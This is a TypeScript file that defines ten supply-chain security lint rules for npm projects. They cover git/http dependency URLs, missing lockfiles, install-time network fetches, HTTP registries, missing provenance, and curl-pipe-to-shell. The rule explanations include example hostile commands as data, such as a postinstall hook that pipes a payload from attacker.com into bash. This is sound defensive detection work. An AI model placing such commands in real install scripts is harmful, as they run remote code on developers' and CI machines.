// Copyright (c) 2024–2026 Holley Studio LLC. All rights reserved.
/**
 * Supply chain security rules (SC_001–010).
 *
 * Detects dependency confusion, lockfile integrity issues, and CI supply-chain
 * attack vectors. These patterns don't overlap with slopsquatting.ts (which
 * detects phantom packages) — these detect package source and publish security.
 */

import type { ThesmosRule, DetectInput, Finding } from '../types';
import { classifySeverity } from '../severity';

// ── Helpers ───────────────────────────────────────────────────────────────────

function isPackageJson(path: string): boolean {
  return path === 'package.json' || path.endsWith('/package.json');
}

function isNpmrc(path: string): boolean {
  return path === '.npmrc' || path.endsWith('/.npmrc');
}

function isLockfile(path: string): boolean {
  return (
    path === 'package-lock.json' ||
    path === 'yarn.lock' ||
    path === 'pnpm-lock.yaml' ||
    path.endsWith('/package-lock.json') ||
    path.endsWith('/yarn.lock') ||
    path.endsWith('/pnpm-lock.yaml')
  );
}

function isCiWorkflow(path: string): boolean {
  return /\.github\/workflows\/.*\.ya?ml$/.test(path);
}

function isShellScript(path: string): boolean {
  return /\.(sh|bash|zsh)$/.test(path);
}

// ── Rules ─────────────────────────────────────────────────────────────────────

export const SUPPLY_CHAIN_RULES: ThesmosRule[] = [
  {
    id: 'SC_001',
    category: 'sc_git_dependency_url',
    description: 'package.json dependency with git:, github:, or http: URL — unpinned and unaudited source.',
    severity: 'HIGH',
    tags: ['security', 'supply-chain', 'dependencies'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'Dependencies resolved from git URLs or plain HTTP bypass npm\'s checksum verification and ignore lockfile integrity. An attacker who compromises the upstream repo can push malicious code that gets pulled silently on next install.',
      commonViolations: [
        '"some-pkg": "github:user/repo"',
        '"some-pkg": "git+https://github.com/user/repo"',
        '"some-pkg": "http://internal.registry/pkg.tgz"',
      ],
      goodExample: '"some-pkg": "1.2.3"',
      badExample: '"some-pkg": "github:user/repo#main"',
      relatedPlaybooks: ['supply-chain-security.md'],
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_git_dependency_url', config.severityRules);
      const findings: Finding[] = [];
      const GIT_URL_RE = /(?:github:|gitlab:|bitbucket:|git\+https?:|http:\/\/)/;
      for (const { path, content } of changedFiles) {
        if (!isPackageJson(path)) continue;
        let pkg: Record<string, unknown>;
        try { pkg = JSON.parse(content) as Record<string, unknown>; } catch { continue; }
        const depSections = ['dependencies', 'devDependencies', 'peerDependencies', 'optionalDependencies'];
        const lines = content.split('\n');
        for (const section of depSections) {
          const deps = pkg[section];
          if (!deps || typeof deps !== 'object') continue;
          for (const [name, version] of Object.entries(deps as Record<string, string>)) {
            if (GIT_URL_RE.test(version)) {
              const lineIdx = lines.findIndex((l) => l.includes(`"${name}"`) && GIT_URL_RE.test(l));
              findings.push({
                severity: sev,
                category: 'sc_git_dependency_url',
                file: path,
                line: lineIdx >= 0 ? lineIdx + 1 : undefined,
                message: `Dependency "${name}" resolves via git/http URL — bypasses npm checksum verification.`,
                suggestion: 'Publish the package to npm and pin to a specific version number.',
              });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'SC_002',
    category: 'sc_missing_lockfile',
    description: 'package.json present without a lockfile — dependencies are not pinned.',
    severity: 'BLOCKER',
    tags: ['security', 'supply-chain', 'reproducibility'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'Without a lockfile, `npm install` resolves the latest matching version for every dependency on every install. A supply-chain attacker only needs to publish a malicious patch-version bump to get code execution on your next deploy.',
      commonViolations: ['package.json present, no package-lock.json/yarn.lock/pnpm-lock.yaml'],
      goodExample: 'Commit package-lock.json (or yarn.lock / pnpm-lock.yaml) alongside package.json.',
      badExample: 'package.json + node_modules/ but no lockfile committed.',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_missing_lockfile', config.severityRules);
      const findings: Finding[] = [];
      const hasPackageJson = changedFiles.some(({ path }) => isPackageJson(path));
      const hasLockfile = changedFiles.some(({ path }) => isLockfile(path));
      if (hasPackageJson && !hasLockfile) {
        const pkg = changedFiles.find(({ path }) => isPackageJson(path))!;
        findings.push({
          severity: sev,
          category: 'sc_missing_lockfile',
          file: pkg.path,
          message: 'package.json present but no lockfile detected in changed files — dependencies are unpinned.',
          suggestion: 'Run npm install (or yarn/pnpm install) and commit the generated lockfile.',
        });
      }
      return findings;
    },
  },

  {
    id: 'SC_003',
    category: 'sc_postinstall_network_fetch',
    description: 'postinstall/preinstall script fetches from network at install time — potential supply-chain attack vector.',
    severity: 'BLOCKER',
    tags: ['security', 'supply-chain', 'npm-scripts'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'npm lifecycle scripts (postinstall, preinstall) run automatically during npm install. A script that fetches code from the internet and executes it can be used to silently compromise any developer machine or CI environment that installs the package.',
      commonViolations: [
        '"postinstall": "curl https://... | bash"',
        '"postinstall": "node -e \\"require(\'https\').get(...)\\"',
      ],
      goodExample: '"postinstall": "node scripts/patch.js"  // local script only',
      badExample: '"postinstall": "curl -fsSL https://attacker.com/payload | bash"',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_postinstall_network_fetch', config.severityRules);
      const findings: Finding[] = [];
      const NETWORK_RE = /\b(curl|wget|fetch|http\.get|https\.get|axios|got)\b/i;
      for (const { path, content } of changedFiles) {
        if (!isPackageJson(path)) continue;
        let pkg: Record<string, unknown>;
        try { pkg = JSON.parse(content) as Record<string, unknown>; } catch { continue; }
        const scripts = pkg['scripts'] as Record<string, string> | undefined;
        if (!scripts) continue;
        const lines = content.split('\n');
        for (const hook of ['preinstall', 'postinstall', 'install']) {
          const script = scripts[hook];
          if (!script || !NETWORK_RE.test(script)) continue;
          const lineIdx = lines.findIndex((l) => l.includes(`"${hook}"`));
          findings.push({
            severity: sev,
            category: 'sc_postinstall_network_fetch',
            file: path,
            line: lineIdx >= 0 ? lineIdx + 1 : undefined,
            message: `"${hook}" script fetches from network — runs automatically on every npm install.`,
            suggestion: 'Remove network fetches from npm lifecycle scripts. Download assets in a separate explicit step.',
          });
        }
      }
      return findings;
    },
  },

  {
    id: 'SC_004',
    category: 'sc_npmrc_http_registry',
    description: '.npmrc registry URL uses http:// — package downloads are unencrypted and cannot be verified.',
    severity: 'HIGH',
    tags: ['security', 'supply-chain', 'npm'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'An HTTP registry connection allows a network attacker to intercept package downloads and serve malicious code. All npm registry connections must use HTTPS so the TLS certificate validates the server identity and encrypts the payload.',
      commonViolations: ['registry=http://registry.npmjs.org'],
      goodExample: 'registry=https://registry.npmjs.org',
      badExample: 'registry=http://internal.registry.example.com',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_npmrc_http_registry', config.severityRules);
      const findings: Finding[] = [];
      const HTTP_REGISTRY_RE = /^\s*(?:\S+:)?registry\s*=\s*http:\/\//m;
      for (const { path, content } of changedFiles) {
        if (!isNpmrc(path)) continue;
        if (!HTTP_REGISTRY_RE.test(content)) continue;
        const lines = content.split('\n');
        const lineIdx = lines.findIndex((l) => /registry\s*=\s*http:\/\//.test(l));
        findings.push({
          severity: sev,
          category: 'sc_npmrc_http_registry',
          file: path,
          line: lineIdx >= 0 ? lineIdx + 1 : undefined,
          message: 'npm registry configured with http:// — package downloads are unencrypted.',
          suggestion: 'Change registry URL to https://.',
        });
      }
      return findings;
    },
  },

  {
    id: 'SC_005',
    category: 'sc_no_engines_field',
    description: 'package.json missing engines field — any Node.js version is accepted, including insecure EOL versions.',
    severity: 'MEDIUM',
    tags: ['supply-chain', 'compatibility', 'node'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'Without an engines constraint, developers and CI systems may install dependencies on EOL Node.js versions with known CVEs. Pinning a minimum version closes this attack surface and makes build failures explicit rather than silent.',
      commonViolations: ['package.json without an "engines" field'],
      goodExample: '"engines": { "node": ">=20" }',
      badExample: '// no engines field — any Node version accepted',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_no_engines_field', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!isPackageJson(path)) continue;
        let pkg: Record<string, unknown>;
        try { pkg = JSON.parse(content) as Record<string, unknown>; } catch { continue; }
        if (!pkg['engines']) {
          findings.push({
            severity: sev,
            category: 'sc_no_engines_field',
            file: path,
            message: 'package.json has no "engines" field — any Node.js version is accepted.',
            suggestion: 'Add: "engines": { "node": ">=20" } to enforce a minimum Node version.',
          });
        }
      }
      return findings;
    },
  },

  {
    id: 'SC_006',
    category: 'sc_npm_publish_no_provenance',
    description: 'CI npm publish step without --provenance flag — package has no cryptographic build attestation.',
    severity: 'HIGH',
    tags: ['security', 'supply-chain', 'ci', 'provenance'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'npm provenance (--provenance) links the published package to a verifiable CI build log, making supply-chain attacks that swap package contents detectable. Without it, there is no way to verify that the npm tarball matches the source code.',
      commonViolations: [
        'run: npm publish  # in GitHub Actions',
        'run: npm publish --access public  # missing --provenance',
      ],
      goodExample: 'run: npm publish --provenance --access public',
      badExample: 'run: npm publish --access public',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_npm_publish_no_provenance', config.severityRules);
      const findings: Finding[] = [];
      const PUBLISH_RE = /\bnpm\s+publish\b/;
      const PROVENANCE_RE = /--provenance/;
      for (const { path, content } of changedFiles) {
        if (!isCiWorkflow(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          const line = lines[i]!;
          if (PUBLISH_RE.test(line) && !PROVENANCE_RE.test(line)) {
            findings.push({
              severity: sev,
              category: 'sc_npm_publish_no_provenance',
              file: path,
              line: i + 1,
              message: 'npm publish in CI without --provenance — no cryptographic build attestation.',
              suggestion: 'Add --provenance flag: npm publish --provenance --access public',
            });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'SC_007',
    category: 'sc_curl_pipe_bash',
    description: 'curl | bash or wget | sh pattern — downloads and executes arbitrary code from the internet.',
    severity: 'MEDIUM',
    tags: ['security', 'supply-chain', 'shell'],
    sinceVersion: '2.3.0',
    explain: {
      why: '`curl URL | bash` executes whatever the URL returns at that moment — if the server is compromised or the URL is changed, arbitrary code runs on your machine or in CI. Download the script first, inspect it, verify a checksum, then execute.',
      commonViolations: [
        'curl -fsSL https://example.com/install.sh | bash',
        'wget -qO- https://example.com/setup.sh | sh',
      ],
      goodExample: 'curl -fsSL https://example.com/install.sh -o install.sh\nsha256sum -c install.sh.sha256\nbash install.sh',
      badExample: 'curl -fsSL https://example.com/install.sh | bash',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_curl_pipe_bash', config.severityRules);
      const findings: Finding[] = [];
      const PIPE_RE = /\b(?:curl|wget)\b[^|#\n]*\|\s*(?:ba?sh|sh|zsh)\b/;
      for (const { path, content } of changedFiles) {
        if (!isShellScript(path) && !isCiWorkflow(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          if (PIPE_RE.test(lines[i]!)) {
            findings.push({
              severity: sev,
              category: 'sc_curl_pipe_bash',
              file: path,
              line: i + 1,
              message: 'curl/wget piped directly to shell — executes arbitrary code from the network.',
              suggestion: 'Download to a file, verify a checksum, then execute. Never pipe to shell directly.',
            });
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'SC_008',
    category: 'sc_no_files_field',
    description: 'package.json has no "files" field — the entire directory (including source, tests, and .env files) is published to npm.',
    severity: 'HIGH',
    tags: ['security', 'supply-chain', 'npm', 'information-disclosure'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'Without a "files" field, `npm publish` includes everything not in .npmignore. This commonly results in test fixtures, internal config, or .env files with secrets being published to the public registry.',
      commonViolations: ['package.json without a "files" field'],
      goodExample: '"files": ["dist/", "README.md", "CHANGELOG.md"]',
      badExample: '// no "files" field — publishes everything including src/, test/, .env',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_no_files_field', config.severityRules);
      const findings: Finding[] = [];
      for (const { path, content } of changedFiles) {
        if (!isPackageJson(path)) continue;
        let pkg: Record<string, unknown>;
        try { pkg = JSON.parse(content) as Record<string, unknown>; } catch { continue; }
        // Only flag publishable packages (those with a name and version, not private)
        if (pkg['private']) continue;
        if (!pkg['name'] || !pkg['version']) continue;
        if (!pkg['files']) {
          findings.push({
            severity: sev,
            category: 'sc_no_files_field',
            file: path,
            message: 'No "files" field — npm publish will include the entire directory.',
            suggestion: 'Add a "files" array listing only the directories to publish, e.g. ["dist/", "README.md"].',
          });
        }
      }
      return findings;
    },
  },

  {
    id: 'SC_009',
    category: 'sc_lockfile_non_standard_registry',
    description: 'Lockfile contains a "resolved" URL pointing to a non-standard registry.',
    severity: 'HIGH',
    tags: ['security', 'supply-chain', 'dependencies'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'A lockfile entry resolved from an internal or unofficial registry can be silently replaced by a higher-version public registry package in a dependency confusion attack. Verify all lockfile registries match the configured registry in .npmrc.',
      commonViolations: [
        '"resolved": "https://registry.internal.example.com/some-pkg"',
        '"resolved": "https://verdaccio.internal/some-pkg"',
      ],
      goodExample: '"resolved": "https://registry.npmjs.org/..."',
      badExample: '"resolved": "https://internal-registry.example.com/..."',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_lockfile_non_standard_registry', config.severityRules);
      const findings: Finding[] = [];
      const STANDARD_REGISTRIES = /https:\/\/registry\.npmjs\.org|https:\/\/registry\.yarnpkg\.com/;
      const RESOLVED_RE = /"resolved"\s*:\s*"(https?:\/\/[^"]+)"/g;
      for (const { path, content } of changedFiles) {
        if (!isLockfile(path) || !path.endsWith('.json')) continue; // only package-lock.json
        let match;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          RESOLVED_RE.lastIndex = 0;
          while ((match = RESOLVED_RE.exec(lines[i]!)) !== null) {
            const url = match[1]!;
            if (!STANDARD_REGISTRIES.test(url)) {
              findings.push({
                severity: sev,
                category: 'sc_lockfile_non_standard_registry',
                file: path,
                line: i + 1,
                message: `Lockfile entry resolves from non-standard registry: ${url.split('/').slice(0, 3).join('/')}`,
                suggestion: 'Verify this registry is intentional and matches your .npmrc configuration.',
              });
            }
          }
        }
      }
      return findings;
    },
  },

  {
    id: 'SC_010',
    category: 'sc_package_json_git_protocol',
    description: 'package.json dependency uses git:// protocol (not git+https://) — unauthenticated and potentially interceptable.',
    severity: 'HIGH',
    tags: ['security', 'supply-chain', 'dependencies'],
    sinceVersion: '2.3.0',
    explain: {
      why: 'The git:// protocol is unauthenticated and unencrypted. An attacker on the same network can perform a MITM attack to serve malicious code. Always use git+https:// or pin to a specific npm release.',
      commonViolations: ['"some-pkg": "git://github.com/user/repo"'],
      goodExample: '"some-pkg": "1.2.3"  // or git+https://github.com/user/repo#v1.2.3',
      badExample: '"some-pkg": "git://github.com/user/repo"',
    },
    detect({ changedFiles = [], config }: DetectInput): Finding[] {
      const sev = classifySeverity('sc_package_json_git_protocol', config.severityRules);
      const findings: Finding[] = [];
      const GIT_PROTOCOL_RE = /["']git:\/\//;
      for (const { path, content } of changedFiles) {
        if (!isPackageJson(path)) continue;
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          if (GIT_PROTOCOL_RE.test(lines[i]!)) {
            findings.push({
              severity: sev,
              category: 'sc_package_json_git_protocol',
              file: path,
              line: i + 1,
              message: 'Dependency uses git:// (unauthenticated, unencrypted) — use git+https:// or a pinned npm version.',
              suggestion: 'Replace with a pinned npm version or git+https:// URL.',
            });
          }
        }
      }
      return findings;
    },
  },
];
